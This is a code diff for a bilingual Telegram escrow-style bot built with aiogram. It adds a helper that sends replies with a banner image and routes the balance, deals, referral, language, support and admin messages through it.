@@ -2,7 +2,7 @@ import os
 import logging
 import asyncio
 from aiogram import Bot, Dispatcher, types
-from aiogram.filters import Command, StateFilter
+from aiogram.filters import Command
 from aiogram.fsm.context import FSMContext
 from aiogram.fsm.state import State, StatesGroup
 from aiogram.fsm.storage.memory import MemoryStorage
@@ -50,9 +50,9 @@ CUSTOM_EMOJI_CREATE    = "6084717714847306634"   # 📌
 CUSTOM_EMOJI_SUPPORT   = "5447410659077661506"   # 🌐
 CUSTOM_EMOJI_COPY      = "6084717714847306634"   # 📌
 CUSTOM_EMOJI_BACK      = "5197269100878907942"   # ✍️
-CUSTOM_EMOJI_SEARCH    = "6084717714847306634"   # 📌 (заменяет 🔍)
-CUSTOM_EMOJI_WITHDRAW  = "6041730074376410123"   # 📥 (заменяет 💸)
-CUSTOM_EMOJI_TRANSACT  = "5794241397217304511"   # 📦 (заменяет 📊)
+CUSTOM_EMOJI_SEARCH    = "6084717714847306634"   # 📌
+CUSTOM_EMOJI_WITHDRAW  = "6041730074376410123"   # 📥
+CUSTOM_EMOJI_TRANSACT  = "5794241397217304511"   # 📦
 
 # ---------- Тексты (везде премиум) ----------
 REF_LINK_TEMPLATE = "https://t.me/lolzgaranterbot?start=ref{user_id}"
@@ -91,7 +91,7 @@ TEXTS = {
         'deals_title': "Мои сделки",
         'deals_stats': f"Всего: {{total}} {EMOJI_TROPHY} Завершено: {{completed}} {EMOJI_PACKAGE}",
         'deals_list_empty': "У вас пока нет сделок.",
-        'search_btn': f"{EMOJI_PACKAGE} Поиск по коду",   # используем 📦 как премиум
+        'search_btn': f"{EMOJI_PACKAGE} Поиск по коду",
         'search_prompt': "Введите код сделки (например, Yi4qbQ98):",
         'deal_not_found': "Сделка с кодом {code} не найдена.",
         'deal_details': (
@@ -202,8 +202,23 @@ def get_user_balance(user_id: int) -> float:
 def get_user_completed_deals(user_id: int) -> int:
     return user_completed_deals.get(user_id, 0)
 
+# ---------- Отправка любого сообщения с баннером ----------
+async def send_with_banner(target, text, keyboard=None, parse_mode="HTML"):
+    """Отправляет фото с баннером и подписью, если не удаётся – отправляет текст"""
+    try:
+        if isinstance(target, types.Message):
+            await target.answer_photo(photo=BANNER_URL, caption=text, parse_mode=parse_mode, reply_markup=keyboard)
+        else:  # предположительно CallbackQuery
+            await target.message.answer_photo(photo=BANNER_URL, caption=text, parse_mode=parse_mode, reply_markup=keyboard)
+    except Exception as e:
+        logging.error(f"Ошибка отправки баннера: {e}")
+        if isinstance(target, types.Message):
+            await target.answer(text, parse_mode=parse_mode, reply_markup=keyboard)
+        else:
+            await target.message.answer(text, parse_mode=parse_mode, reply_markup=keyboard)
+
 # ---------- Отправка главного меню ----------
-async def send_main_menu(message: types.Message, user_id: int):
+async def send_main_menu(target, user_id: int):
     text = get_text(user_id, 'welcome')
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
         [
@@ -222,11 +237,7 @@ async def send_main_menu(message: types.Message, user_id: int):
             InlineKeyboardButton(text=get_text(user_id, 'support'), icon_custom_emoji_id=CUSTOM_EMOJI_SUPPORT, callback_data="support")
         ]
     ])
-    try:
-        await message.answer_photo(photo=BANNER_URL, caption=text, parse_mode="HTML", reply_markup=keyboard)
-    except Exception as e:
-        logging.error(f"Ошибка отправки баннера: {e}")
-        await message.answer(text, parse_mode="HTML", reply_markup=keyboard)
+    await send_with_banner(target, text, keyboard)
 
 # ---------- Команда /start ----------
 @dp.message(Command("start"))
@@ -242,20 +253,16 @@ async def cb_balance(callback: types.CallbackQuery):
     user_id = callback.from_user.id
     balance = get_user_balance(user_id)
     completed = get_user_completed_deals(user_id)
-    lang = user_lang.get(user_id, 'ru')
-    
     if balance == 0:
         balance_text = get_text(user_id, 'balance_empty')
     else:
         balance_text = get_text(user_id, 'balance_amount').format(amount=balance)
-    
     text = (
         f"<b>{get_text(user_id, 'balance_title')}</b>\n\n"
         f"{balance_text}\n"
         f"{get_text(user_id, 'completed_deals').format(completed=completed)}\n\n"
         f"{get_text(user_id, 'withdraw_need')}"
     )
-    
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
         [
             InlineKeyboardButton(text=get_text(user_id, 'withdraw_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_WITHDRAW, callback_data="withdraw")
@@ -267,7 +274,7 @@ async def cb_balance(callback: types.CallbackQuery):
             InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")
         ]
     ])
-    await callback.message.answer(text, parse_mode="HTML", reply_markup=keyboard)
+    await send_with_banner(callback, text, keyboard)
     await callback.answer()
 
 # ---------- Вывод средств (FSM) ----------
@@ -327,7 +334,7 @@ async def cb_transactions(callback: types.CallbackQuery):
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")]
     ])
-    await callback.message.answer(text, parse_mode="HTML", reply_markup=keyboard)
+    await send_with_banner(callback, text, keyboard)
     await callback.answer()
 
 # ---------- Мои сделки ----------
@@ -349,7 +356,6 @@ async def cb_deals(callback: types.CallbackQuery):
         text += "\n" + "\n".join(items)
     else:
         text += "\n" + get_text(user_id, 'deals_list_empty')
-    
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
         [
             InlineKeyboardButton(text=get_text(user_id, 'search_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_SEARCH, callback_data="search_deal")
@@ -358,7 +364,7 @@ async def cb_deals(callback: types.CallbackQuery):
             InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")
         ]
     ])
-    await callback.message.answer(text, parse_mode="HTML", reply_markup=keyboard)
+    await send_with_banner(callback, text, keyboard)
     await callback.answer()
 
 @dp.callback_query(lambda c: c.data == "search_deal")
@@ -389,7 +395,7 @@ async def process_search_code(message: Message, state: FSMContext):
         keyboard = InlineKeyboardMarkup(inline_keyboard=[
             [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")]
         ])
-        await message.answer(details, parse_mode="HTML", reply_markup=keyboard)
+        await send_with_banner(message, details, keyboard)   # отправляем с баннером
     await state.clear()
 
 # ---------- Рефералы ----------
@@ -407,7 +413,7 @@ async def cb_referrals(callback: types.CallbackQuery):
             InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")
         ]
     ])
-    await callback.message.answer(ref_text, parse_mode="HTML", reply_markup=keyboard)
+    await send_with_banner(callback, ref_text, keyboard)
     await callback.answer()
 
 @dp.callback_query(lambda c: c.data == "copy_ref")
@@ -430,7 +436,7 @@ async def cb_lang(callback: types.CallbackQuery):
             InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")
         ]
     ])
-    await callback.message.answer(text, parse_mode="HTML", reply_markup=keyboard)
+    await send_with_banner(callback, text, keyboard)
     await callback.answer()
 
 @dp.callback_query(lambda c: c.data.startswith("lang_"))
@@ -438,34 +444,46 @@ async def cb_lang_set(callback: types.CallbackQuery):
     user_id = callback.from_user.id
     lang_code = callback.data.split("_")[1]
     user_lang[user_id] = lang_code
-    await send_main_menu(callback.message, user_id)
+    await send_main_menu(callback, user_id)
     await callback.answer()
 
 # ---------- Назад в меню ----------
 @dp.callback_query(lambda c: c.data == "back_to_menu")
 async def cb_back_to_menu(callback: types.CallbackQuery):
     user_id = callback.from_user.id
-    await send_main_menu(callback.message, user_id)
+    await send_main_menu(callback, user_id)
     await callback.answer()
 
 # ---------- Остальные кнопки (заглушки) ----------
 @dp.callback_query(lambda c: c.data == "requisites")
 async def cb_requisites(callback: types.CallbackQuery):
-    lang = user_lang.get(callback.from_user.id, 'ru')
-    msg = "💳 Реквизиты: карта ****, BTC..." if lang == 'ru' else "💳 Requisites: card ****, BTC..."
-    await callback.answer(msg, show_alert=True)
+    user_id = callback.from_user.id
+    text = "💳 Реквизиты: карта ****, BTC..." if user_lang.get(user_id, 'ru') == 'ru' else "💳 Requisites: card ****, BTC..."
+    keyboard = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")]
+    ])
+    await send_with_banner(callback, text, keyboard)
+    await callback.answer()
 
 @dp.callback_query(lambda c: c.data == "create")
 async def cb_create(callback: types.CallbackQuery):
-    lang = user_lang.get(callback.from_user.id, 'ru')
-    msg = "✍️ Создание сделки (заглушка)" if lang == 'ru' else "✍️ Create deal (stub)"
-    await callback.answer(msg, show_alert=True)
+    user_id = callback.from_user.id
+    text = "✍️ Создание сделки (заглушка)" if user_lang.get(user_id, 'ru') == 'ru' else "✍️ Create deal (stub)"
+    keyboard = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")]
+    ])
+    await send_with_banner(callback, text, keyboard)
+    await callback.answer()
 
 @dp.callback_query(lambda c: c.data == "support")
 async def cb_support(callback: types.CallbackQuery):
-    lang = user_lang.get(callback.from_user.id, 'ru')
-    msg = "🛠 Поддержка: @LZSupportBot" if lang == 'ru' else "🛠 Support: @LZSupportBot"
-    await callback.answer(msg, show_alert=True)
+    user_id = callback.from_user.id
+    text = f"{EMOJI_SHIELD} Техподдержка\n\nСвязь: @LZSupportBot" if user_lang.get(user_id, 'ru') == 'ru' else f"{EMOJI_SHIELD} Support\n\nContact: @LZSupportBot"
+    keyboard = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")]
+    ])
+    await send_with_banner(callback, text, keyboard)
+    await callback.answer()
 
 # ---------- Админ-панель ----------
 ADMIN_ID = 8297446667
@@ -476,7 +494,7 @@ async def cmd_hyteam(message: types.Message):
     if user_id != ADMIN_ID:
         await message.answer(get_text(user_id, 'admin_no_access'))
         return
-    await message.answer(get_text(user_id, 'admin_panel'))
+    await send_with_banner(message, get_text(user_id, 'admin_panel'))
 
 @dp.message(Command("vvteam"))
 async def cmd_vvteam(message: types.Message):
@@ -485,7 +503,7 @@ async def cmd_vvteam(message: types.Message):
         await message.answer(get_text(user_id, 'admin_no_access'))
         return
     if not withdraw_requests:
-        await message.answer(get_text(user_id, 'admin_withdraw_empty'))
+        await send_with_banner(message, get_text(user_id, 'admin_withdraw_empty'))
         return
     list_text = ""
     keyboard_buttons = []
@@ -495,11 +513,11 @@ async def cmd_vvteam(message: types.Message):
         list_text += f"{idx+1}. Пользователь {req['user_id']}, сумма {req['amount']} TON, реквизиты: {req['requisites']}\n"
         keyboard_buttons.append([InlineKeyboardButton(text=f"Подтвердить #{idx+1}", callback_data=f"confirm_withdraw_{idx}")])
     if not list_text:
-        await message.answer(get_text(user_id, 'admin_withdraw_empty'))
+        await send_with_banner(message, get_text(user_id, 'admin_withdraw_empty'))
         return
     text = get_text(user_id, 'admin_withdraw_list').format(list=list_text)
     keyboard = InlineKeyboardMarkup(inline_keyboard=keyboard_buttons + [[InlineKeyboardButton(text="Обновить", callback_data="refresh_admin")]])
-    await message.answer(text, parse_mode="HTML", reply_markup=keyboard)
+    await send_with_banner(message, text, keyboard)
 
 @dp.callback_query(lambda c: c.data.startswith("confirm_withdraw_"))
 async def cb_confirm_withdraw(callback: types.CallbackQuery):
